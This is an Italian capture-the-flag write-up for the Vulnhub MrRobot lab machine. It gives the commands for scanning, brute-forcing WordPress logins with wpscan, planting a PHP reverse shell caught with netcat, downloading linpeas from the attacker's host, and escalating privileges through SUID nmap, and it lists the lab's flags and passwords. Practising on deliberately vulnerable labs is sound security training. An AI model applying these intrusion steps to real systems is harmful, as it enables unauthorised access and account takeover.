![](mrrobot.png)
# MrRobot -Vulnhub Writeup

## Scansione nmap
```bash
nmap -sCV -O iptarget
```
## dirbuster
pagine di login(wp-login.php)
visitamo wp-login.php
visitiamo robots.txt 
## flag 073403c8a58a1f80d943455fb30724b9

## Brute force
in robots.dic
```bash
wget path di robots.dic
```
eliminiamo le parole che si ripetono
```bash
sort -u fsocity.dic > fsocitypulito.dic
```
controlliamo
```bash
wc -w fsocitypulito.dic (11451 parole)
```
ora in wp-login.php notiamo che wordpress ci dice se un utente esiste o meno
sapendo questo,proviamo un username (protagonista della serie di mrobot)
e un password random
vediamo che ci viene detto che solo la password e sbagliata
quindi eseguiamo un bruteforce con wpscan
## wpscan
```bash
wpscan --url http://192.168.178.180/wp-login.php -U elliot -P /home/kali/fsocitypulito.dic
```
Password : ER28-0652
oa che siamo dentro
andiamo su appearance/editor 
e modifichiamo ad esempio la pagina 404
carichiamo un shell php
in un temrinale su kali avviamo netcat
```bash 
nc -lvnp 4441
```
impostiamo una shell stabile
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
troviamo l'hash della password di robot (in md5)
password: abcdefghijklmnopqrstuvwxyz
# flag robot 
## 822c73956184f694993bede3eb39f959
per diventare root
avviamo un server python con
```bash 
python -m http.server 8000 (dentro la cartella di linpeas)
```
dalla shell scaricare linpeas
```bash 
wget http://ip:8000/linpeas.sh
```
consiglio di scaricarla dentro la cartella tmp
```bash
chmod +x linpeas.sh
./linpeas.sh
```
notiamo che nmap ha i privilegi di root
```bash
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
eseguiamo nmap --interactive
!sh
whoami (controlliamo che siamo root)
```
ora andiamo nella cartella /root
# root flag 
## 04787ddef27c3dee1ee161b21670b4e4